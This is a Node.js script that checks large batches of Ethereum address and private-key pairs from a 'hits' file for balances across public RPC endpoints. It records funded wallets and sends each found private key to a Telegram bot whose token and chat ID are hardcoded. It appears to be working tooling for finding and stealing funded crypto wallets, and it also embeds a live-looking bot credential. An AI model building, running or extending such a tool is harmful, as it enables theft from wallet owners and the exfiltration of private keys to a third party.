const fs = require('fs')
const https = require('https')
const ethers = require('ethers')
require('colors')
const { rpcPool, getSortedPool, markSuccess, markError, benchmarkPool, discoverNewRpcs } = require('./rpc-manager')

// ─── Config ────────────────────────────────────────────────────────────

const HITS_FILE         = 'hits.txt'
const FUNDED_FILE       = 'funded.txt'
const STATS_FILE        = 'checker_stats.json'
const REPORT_FILE       = 'cb_session_report.json'
const FLUSH_EVERY       = 100
const BENCHMARK_MS      = 30000

const args          = process.argv.slice(2)
const concArg       = args.indexOf('-c')
const BATCH_SIZE    = concArg !== -1 ? parseInt(args[concArg + 1]) || 200 : 200

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8633932788:AAG1L1maHh8mUwTG5QjHOMI0Q21zfeO0VmM'
const TG_CHAT  = process.env.TELEGRAM_CHAT_ID   || '1708124942'

// ─── Module-level session state (needed for signal handlers) ───────────

let sessionChecked = 0
let startTime      = Date.now()
let rpcRoundIdx    = 0

// ─── Telegram ─────────────────────────────────────────────────────────

function sendTelegram(message) {
    if (!TG_TOKEN || !TG_CHAT) return
    const body = JSON.stringify({ chat_id: TG_CHAT, text: message, parse_mode: 'HTML' })
    const req = https.request({
        hostname: 'api.telegram.org',
        path: `/bot${TG_TOKEN}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    })
    req.on('error', () => {})
    req.write(body)
    req.end()
}

// ─── Stats ─────────────────────────────────────────────────────────────

function loadStats() {
    try { return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8')) }
    catch (_) { return { total_checked_all_time: 0, total_funded_all_time: 0 } }
}

const _persisted = loadStats()
const allTimeBase = _persisted.total_checked_all_time || 0

function saveStats() {
    try {
        fs.writeFileSync(STATS_FILE, JSON.stringify({
            total_checked_all_time: allTimeBase + sessionChecked,
            total_funded_all_time:  getFundedCount(),
            session_checked:        sessionChecked,
            last_updated:           new Date().toISOString(),
        }, null, 2))
    } catch (_) {}
}

function saveSessionReport() {
    try {
        const elapsed = Math.floor((Date.now() - startTime) / 1000)
        fs.writeFileSync(REPORT_FILE, JSON.stringify({
            ended:            new Date().toISOString(),
            duration_seconds: elapsed,
            session_checked:  sessionChecked,
            avg_rate:         elapsed > 0 ? Math.floor(sessionChecked / elapsed) : 0,
            funded:           getFundedCount(),
            all_time_total:   allTimeBase + sessionChecked,
        }, null, 2))
    } catch (_) {}
}

// ─── File helpers ──────────────────────────────────────────────────────

function getFundedCount() {
    try { return fs.readFileSync(FUNDED_FILE, 'utf8').split('\n').filter(l => l.trim()).length }
    catch (_) { return 0 }
}

function readAllEntries() {
    if (!fs.existsSync(HITS_FILE)) return []
    const seen = new Set()
    return fs.readFileSync(HITS_FILE, 'utf8')
        .split('\n')
        .map(l => l.trim())
        .filter(l => l.length > 0)
        .map(l => { const p = l.split(','); return { address: p[0], key: p[1], raw: l } })
        .filter(e => e.address && e.key && !seen.has(e.address) && seen.add(e.address))
}

function flushProcessed(checkedSet) {
    if (!fs.existsSync(HITS_FILE)) return
    const remaining = fs.readFileSync(HITS_FILE, 'utf8')
        .split('\n')
        .filter(l => !checkedSet.has(l.trim()))
    fs.writeFileSync(HITS_FILE, remaining.join('\n'))
}

function saveFunded(entry, balance) {
    const ethStr = ethers.formatEther(balance)
    fs.appendFileSync(FUNDED_FILE, `${entry.address},${entry.key},${ethStr} ETH\n`)
    sendTelegram(
        `🚨 <b>FUNDED WALLET FOUND</b>\n` +
        `Address: <code>${entry.address}</code>\n` +
        `Key: <code>${entry.key}</code>\n` +
        `ETH: ${ethStr}`
    )
    console.log('\n' + '='.repeat(62).green)
    console.log('  *** FUNDED WALLET ***'.bgGreen.black)
    console.log(`  Address : ${entry.address}`.green)
    console.log(`  Key     : ${entry.key}`.green)
    console.log(`  ETH     : ${ethStr}`.green)
    console.log('='.repeat(62).green + '\n')
}

// ─── RPC batch request ─────────────────────────────────────────────────

async function batchGetBalances(entries) {
    const requests = entries.map((entry, i) => ({
        jsonrpc: '2.0', method: 'eth_getBalance',
        params: [entry.address, 'latest'], id: i,
    }))
    const body   = JSON.stringify(requests)
    const sorted = getSortedPool()
    if (sorted.length === 0) return new Map()

    const rpc = sorted[rpcRoundIdx % sorted.length]
    rpcRoundIdx++

    async function tryRpc(r) {
        const t         = Date.now()
        const raw       = await require('./rpc-manager').rawRequest(r.url, body)
        const responses = JSON.parse(raw)
        markSuccess(r, Date.now() - t)
        return responses
    }

    let responses
    try {
        responses = await tryRpc(rpc)
    } catch (e) {
        markError(rpc)
        const fallback = sorted.find(s => s !== rpc && s.alive)
        if (!fallback) return new Map()
        try { responses = await tryRpc(fallback) }
        catch (e2) { markError(fallback); return new Map() }
    }

    const resultMap = new Map()
    if (!Array.isArray(responses)) return resultMap
    for (const res of responses) {
        const entry = entries[res.id]
        if (!entry) continue
        resultMap.set(entry.address, res.result ? BigInt(res.result) : null)
    }
    return resultMap
}

// ─── Graceful shutdown ─────────────────────────────────────────────────

function shutdown(signal) {
    console.log(`\n[${signal}] Stopping — saving data...`.yellow)
    saveStats()
    saveSessionReport()
    const elapsed = Math.floor((Date.now() - startTime) / 1000)
    const rate    = elapsed > 0 ? Math.floor(sessionChecked / elapsed) : 0
    sendTelegram(
        `🔴 <b>Balance Checker Stopped</b> (${signal})\n` +
        `Checked: ${sessionChecked.toLocaleString()} | Avg rate: ${rate}/s\n` +
        `All-time: ${(allTimeBase + sessionChecked).toLocaleString()}`
    )
    process.exit(0)
}

process.on('SIGINT',  () => shutdown('SIGINT'))
process.on('SIGTERM', () => shutdown('SIGTERM'))

// ─── Periodic benchmark ────────────────────────────────────────────────

setInterval(async () => {
    try { await benchmarkPool(true) } catch (_) {}
}, BENCHMARK_MS)

// ─── Main ─────────────────────────────────────────────────────────────

async function main() {
    startTime = Date.now()

    const tgStatus = TG_TOKEN && TG_CHAT ? 'enabled'.green : 'disabled'.gray
    const aliveAtStart = rpcPool.filter(r => r.alive).length

    console.log('\nEthereum Balance Checker (Smart RPC Mode)'.cyan.bold)
    console.log('=========================================='.cyan)
    console.log(`Batch size   : ${BATCH_SIZE} addresses/request`)
    console.log(`Re-rank      : every ${BENCHMARK_MS / 1000}s automatically`)
    console.log(`Flush every  : ${FLUSH_EVERY} entries (resume-safe)`)
    console.log(`Telegram     : ${tgStatus}`)
    console.log(`All-time     : ${allTimeBase.toLocaleString()} checked`)
    console.log(`\nTip: node check-balances.js -c 500  (larger batch)\n`.gray)

    sendTelegram(
        `🟢 <b>Balance Checker Started</b>\n` +
        `Batch: ${BATCH_SIZE} | All-time: ${allTimeBase.toLocaleString()} checked`
    )

    console.log('  Benchmarking RPCs...')
    await benchmarkPool(false)

    console.log('  Discovering new public RPCs...')
    const added = await discoverNewRpcs(false)
    if (added === 0) console.log('  No new RPCs found.\n')

    const checkedRaws = new Set()
    let   flushCount  = 0

    while (true) {
        const entries = readAllEntries()

        if (entries.length === 0) {
            console.log(`  [~] Waiting for entries in hits.txt... | Funded: ${getFundedCount()}`)
            await new Promise(r => setTimeout(r, 5000))
            continue
        }

        const aliveCount = rpcPool.filter(r => r.alive).length
        if (aliveCount === 0) {
            console.log('  [!] No alive RPCs — waiting 10s...'.yellow)
            await new Promise(r => setTimeout(r, 10000))
            continue
        }

        const batches = []
        for (let i = 0; i < entries.length; i += BATCH_SIZE) {
            batches.push(entries.slice(i, i + BATCH_SIZE))
        }

        console.log(
            `\n  Checking ${entries.length.toLocaleString()} wallets` +
            ` | ${batches.length} batches` +
            ` | ${aliveCount}/${rpcPool.length} RPCs alive`.cyan
        )

        const MAX_PARALLEL = Math.min(aliveCount * 2, 12, batches.length)
        let batchIdx = 0

        async function processNextBatch() {
            while (batchIdx < batches.length) {
                const batch    = batches[batchIdx++]
                const balances = await batchGetBalances(batch)

                for (const entry of batch) {
                    const bal = balances.get(entry.address)
                    if (bal !== undefined && bal !== null && bal > 0n) {
                        saveFunded(entry, bal)
                    }
                    checkedRaws.add(entry.raw)
                    sessionChecked++
                    flushCount++
                }

                // Flush frequently for resume-safety
                if (flushCount >= FLUSH_EVERY) {
                    flushProcessed(checkedRaws)
                    flushCount = 0
                }

                const elapsed   = Math.floor((Date.now() - startTime) / 1000)
                const rate      = elapsed > 0 ? Math.floor(sessionChecked / elapsed) : 0
                const funded    = getFundedCount()
                const best      = getSortedPool()[0]
                const bestLabel = best ? best.url.replace(/^https?:\/\//, '').slice(0, 22) : 'none'
                const bestMs    = best ? best.latency + 'ms' : '-'
                const remain    = entries.length - sessionChecked

                process.stdout.write(
                    `\r  Chk: ${sessionChecked.toLocaleString()}` +
                    ` | Left: ${remain.toLocaleString()}` +
                    ` | Rate: ${rate.toLocaleString()}/s` +
                    ` | Best: ${bestLabel} (${bestMs})` +
                    ` | Funded: ${funded > 0 ? String(funded).bgGreen.black : '0'}   `
                )
            }
        }

        await Promise.all(Array.from({ length: MAX_PARALLEL }, processNextBatch))
        console.log('')
        flushProcessed(checkedRaws)
        saveStats()
    }
}

main().catch(err => {
    console.error('\n[FATAL]'.red, err.message)
    process.exit(1)
})
